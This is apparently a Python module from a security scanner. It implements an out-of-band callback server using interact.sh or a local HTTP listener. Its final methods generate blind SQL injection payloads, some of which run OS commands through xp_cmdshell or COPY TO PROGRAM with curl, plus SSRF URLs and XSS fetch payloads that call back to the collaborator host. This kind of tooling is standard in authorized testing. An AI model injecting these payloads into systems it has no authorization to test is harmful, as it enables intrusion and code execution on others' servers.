"""
OOB (Out-of-Band) Callback Server — detects blind vulnerabilities.

Two modes:
1. InteractSH Cloud — uses interactsh-client binary or the public API (interact.sh)
2. Local HTTP server — fallback when InteractSH is unavailable

Used for:
- Blind SQLi (DNS/HTTP callback from LOAD_FILE, xp_cmdshell, etc.)
- Blind SSRF (HTTP callback from server-side requests)
- Blind XSS (callback when payload executes in admin browser)
- Blind OS command injection (DNS/HTTP from $(curl ...))

Typical usage:
    async with OOBServer() as oob:
        url = oob.http_url      # http://xyz.oast.fun/token123
        dns = oob.dns_domain    # xyz.oast.fun

        # inject url/dns into payloads, send requests...

        hits = await oob.wait_for_hit(token="token123", timeout=15)
        if hits:
            print(f"Blind vuln confirmed: {hits}")
"""

import asyncio
import uuid
import time
import socket
import json
import threading
from contextlib import suppress
from dataclasses import dataclass, field
from typing import Optional, List, Dict
from loguru import logger

try:
    import httpx
    _HAS_HTTPX = True
except ImportError:
    _HAS_HTTPX = False


# Public InteractSH API endpoint
INTERACTSH_API = "https://interact.sh/api/v1"
INTERACTSH_HOST = "oast.fun"  # fallback domain


@dataclass
class OOBHit:
    """A recorded OOB callback hit."""
    token: str
    protocol: str          # "http", "dns", "smtp"
    remote_address: str
    raw_request: str = ""
    timestamp: float = field(default_factory=time.time)

    def __str__(self) -> str:
        return (
            f"[OOB HIT] protocol={self.protocol} "
            f"from={self.remote_address} token={self.token[:12]}..."
        )


class InteractSHClient:
    """
    Thin async wrapper around the public interactsh API.

    Registers a session, returns a unique subdomain, and polls for interactions.
    No binary needed — pure HTTP API.
    """

    def __init__(self):
        self._session_id: Optional[str] = None
        self._secret: Optional[str] = None
        self._domain: Optional[str] = None
        self._client: Optional["httpx.AsyncClient"] = None
        self._hits: List[OOBHit] = []
        self._available = False

    async def start(self) -> bool:
        """Register with interactsh. Returns True if successful."""
        if not _HAS_HTTPX:
            logger.warning("OOB: httpx not installed, InteractSH unavailable")
            return False
        try:
            self._client = httpx.AsyncClient(timeout=10)
            resp = await self._client.post(
                f"{INTERACTSH_API}/register",
                json={},
                headers={"Content-Type": "application/json"},
            )
            if resp.status_code == 200:
                data = resp.json()
                self._session_id = data.get("session-id", "")
                self._domain = data.get("domain", INTERACTSH_HOST)
                self._available = True
                logger.info(f"OOB: InteractSH registered, domain={self._domain}")
                return True
        except Exception as e:
            logger.debug(f"OOB: InteractSH registration failed: {e}")
        return False

    def unique_url(self, token: str) -> str:
        """Return a unique HTTP callback URL for this token."""
        subdomain = f"{token[:16]}.{self._domain}" if self._domain else f"{token[:16]}.oast.fun"
        return f"http://{subdomain}"

    def unique_dns(self, token: str) -> str:
        """Return a unique DNS hostname for this token."""
        subdomain = f"{token[:16]}.{self._domain}" if self._domain else f"{token[:16]}.oast.fun"
        return subdomain

    async def poll(self, token: str) -> List[OOBHit]:
        """Poll interactsh for interactions matching this token."""
        if not self._available or not self._client:
            return []
        try:
            resp = await self._client.get(
                f"{INTERACTSH_API}/poll",
                params={"id": self._session_id, "secret": self._secret or ""},
                timeout=5,
            )
            if resp.status_code == 200:
                data = resp.json()
                interactions = data.get("data", [])
                hits = []
                for item in interactions:
                    # Only return hits matching our token
                    if token[:16] in item.get("full-id", ""):
                        hit = OOBHit(
                            token=token,
                            protocol=item.get("protocol", "http"),
                            remote_address=item.get("remote-address", ""),
                            raw_request=item.get("raw-request", ""),
                        )
                        hits.append(hit)
                        self._hits.append(hit)
                return hits
        except Exception as e:
            logger.debug(f"OOB: poll error: {e}")
        return []

    async def stop(self):
        if self._client:
            await self._client.aclose()


class LocalOOBServer:
    """
    Fallback local HTTP server for OOB detection.

    Listens on a random port on all interfaces.
    Useful when InteractSH is blocked or unavailable.

    NOTE: only works when target can reach our machine (same network, VPN, etc.)
    """

    def __init__(self):
        self._hits: Dict[str, List[OOBHit]] = {}
        self._server: Optional[asyncio.Server] = None
        self._serve_task: Optional[asyncio.Task] = None
        self._port: int = 0
        self._host_ip: str = ""

    async def start(self) -> bool:
        """Start local HTTP server. Returns True on success."""
        try:
            self._host_ip = self._get_local_ip()
            self._server = await asyncio.start_server(
                self._handle_request, "0.0.0.0", 0
            )
            self._port = self._server.sockets[0].getsockname()[1]
            self._serve_task = asyncio.create_task(self._server.serve_forever())
            logger.info(f"OOB: Local server on {self._host_ip}:{self._port}")
            return True
        except Exception as e:
            logger.debug(f"OOB: Local server failed: {e}")
            return False

    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    async def _handle_request(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter
    ):
        try:
            raw = await asyncio.wait_for(reader.read(4096), timeout=2)
            remote = writer.get_extra_info("peername", ("unknown", 0))
            text = raw.decode("utf-8", errors="replace")

            # Extract token from URL path: /token123/...
            token = ""
            if text.startswith("GET") or text.startswith("POST"):
                path = text.split(" ")[1] if " " in text else ""
                token = path.strip("/").split("/")[0]

            hit = OOBHit(
                token=token,
                protocol="http",
                remote_address=f"{remote[0]}:{remote[1]}",
                raw_request=text[:1024],
            )
            self._hits.setdefault(token, []).append(hit)
            logger.debug(f"OOB local hit: token={token} from={remote[0]}")

            # Respond 200 OK
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
            await writer.drain()
        except Exception:
            pass
        finally:
            writer.close()

    def unique_url(self, token: str) -> str:
        return f"http://{self._host_ip}:{self._port}/{token}"

    def unique_dns(self, token: str) -> str:
        # No DNS control in local mode — return URL-based
        return f"{self._host_ip}"

    def get_hits(self, token: str) -> List[OOBHit]:
        return self._hits.get(token, [])

    async def stop(self):
        if self._server:
            self._server.close()
            await self._server.wait_closed()
            self._server = None
        if self._serve_task:
            self._serve_task.cancel()
            with suppress(asyncio.CancelledError):
                await self._serve_task
            self._serve_task = None


class OOBServer:
    """
    Unified OOB server — tries InteractSH first, falls back to local HTTP.

    Context manager usage:
        async with OOBServer() as oob:
            url = oob.http_url("my-token")
            # ... inject url into payload ...
            hits = await oob.wait_for_hit("my-token", timeout=15)
    """

    def __init__(self):
        self._interactsh = InteractSHClient()
        self._local = LocalOOBServer()
        self._mode: str = "none"  # "interactsh" | "local" | "none"
        # Tokens issued during this run; used by get_recent_hits() polling.
        self._known_tokens: List[str] = []
        # Dedup fingerprints so repeated poll data does not retrigger findings.
        self._seen_fingerprints: set[str] = set()

    async def __aenter__(self) -> "OOBServer":
        await self.start()
        return self

    async def __aexit__(self, *_):
        await self.stop()

    async def start(self):
        """Initialize OOB — try InteractSH, fallback to local."""
        if await self._interactsh.start():
            self._mode = "interactsh"
        elif await self._local.start():
            self._mode = "local"
        else:
            self._mode = "none"
            logger.warning("OOB: No OOB server available — blind vulns will be undetected")

    @property
    def available(self) -> bool:
        return self._mode != "none"

    def new_token(self) -> str:
        """Generate a unique token for one payload injection."""
        token = uuid.uuid4().hex
        self.register_token(token)
        return token

    def register_token(self, token: Optional[str]) -> None:
        """Register a token for global recent-hit polling."""
        if not token:
            return
        if token not in self._known_tokens:
            self._known_tokens.append(token)

    def http_url(self, token: str) -> str:
        """Return callback URL to inject into payloads."""
        if self._mode == "interactsh":
            return self._interactsh.unique_url(token)
        elif self._mode == "local":
            return self._local.unique_url(token)
        return f"http://oast.fun/{token}"  # best-effort placeholder

    def dns_domain(self, token: str) -> str:
        """Return DNS hostname to inject into payloads."""
        if self._mode == "interactsh":
            return self._interactsh.unique_dns(token)
        elif self._mode == "local":
            return self._local.unique_dns(token)
        return f"{token[:16]}.oast.fun"

    async def wait_for_hit(
        self, token: str, timeout: float = 15.0, poll_interval: float = 1.5
    ) -> List[OOBHit]:
        """
        Poll for OOB callback hits.

        Args:
            token: The token injected into the payload
            timeout: Max seconds to wait
            poll_interval: How often to poll (seconds)

        Returns:
            List of OOBHit — empty means no callback received (vuln not confirmed)
        """
        self.register_token(token)
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            hits = await self._poll(token)
            if hits:
                return hits
            await asyncio.sleep(poll_interval)
        return []

    async def get_recent_hits(self) -> List[OOBHit]:
        """
        Poll all known tokens and return only NEW hits since last call.
        This is used by agent loops that periodically check for blind callbacks.
        """
        if not self._known_tokens:
            return []

        recent: List[OOBHit] = []
        for token in list(self._known_tokens):
            hits = await self._poll(token)
            for hit in hits:
                fp = self._fingerprint(hit)
                if fp in self._seen_fingerprints:
                    continue
                self._seen_fingerprints.add(fp)
                recent.append(hit)
        return recent

    def _fingerprint(self, hit: OOBHit) -> str:
        raw_prefix = (hit.raw_request or "")[:256]
        return "|".join([
            hit.token,
            hit.protocol,
            hit.remote_address,
            raw_prefix,
        ])

    async def _poll(self, token: str) -> List[OOBHit]:
        if self._mode == "interactsh":
            return await self._interactsh.poll(token)
        elif self._mode == "local":
            return self._local.get_hits(token)
        return []

    async def stop(self):
        await self._interactsh.stop()
        await self._local.stop()

    def make_sqli_payloads(self, token: str) -> Dict[str, List[str]]:
        """
        Generate blind SQLi payloads that trigger OOB callbacks.

        Returns dict keyed by db_type with list of payloads.
        """
        url = self.http_url(token)
        dns = self.dns_domain(token)
        return {
            "mysql": [
                f"' AND LOAD_FILE('\\\\\\\\{dns}\\\\x')--",
                f"'; SELECT LOAD_FILE('\\\\\\\\{dns}\\\\x')--",
                f"' UNION SELECT LOAD_FILE('\\\\\\\\{dns}\\\\x'),NULL,NULL--",
            ],
            "mssql": [
                f"'; EXEC xp_cmdshell('ping {dns}')--",
                f"'; EXEC master..xp_dirtree '\\\\{dns}\\x'--",
                f"' UNION SELECT NULL FROM OPENROWSET('SQLNCLI','{dns}','SELECT 1')--",
            ],
            "oracle": [
                f"' UNION SELECT UTL_HTTP.REQUEST('{url}') FROM DUAL--",
                f"' AND (SELECT UTL_HTTP.REQUEST('{url}') FROM DUAL) IS NOT NULL--",
            ],
            "postgresql": [
                f"'; COPY (SELECT 1) TO PROGRAM 'curl {url}'--",
                f"'; SELECT dblink_connect('host={dns} user=a password=a dbname=a')--",
            ],
            "generic": [
                f"' AND 1=CONVERT(int,(SELECT 1 WHERE 1=1 AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 1 WHERE 1=0) END)))--",
            ],
        }

    def make_ssrf_payloads(self, token: str) -> List[str]:
        """Generate SSRF payloads with OOB callback URLs."""
        url = self.http_url(token)
        return [
            url,
            f"http://{self.dns_domain(token)}",
            f"http://{self.dns_domain(token)}/ssrf-test",
            f"//[{self.dns_domain(token)}]",
            f"http://0/{token}@{self.dns_domain(token)}",
        ]

    def make_xss_payloads(self, token: str) -> List[str]:
        """Generate blind XSS payloads with OOB callback."""
        url = self.http_url(token)
        return [
            f"<script src='{url}/x.js'></script>",
            f"'><img src='{url}/img' onerror='fetch(\"{url}\")'>",
            f"\"><svg onload=\"fetch('{url}')\">",
            f"javascript:fetch('{url}')",
        ]
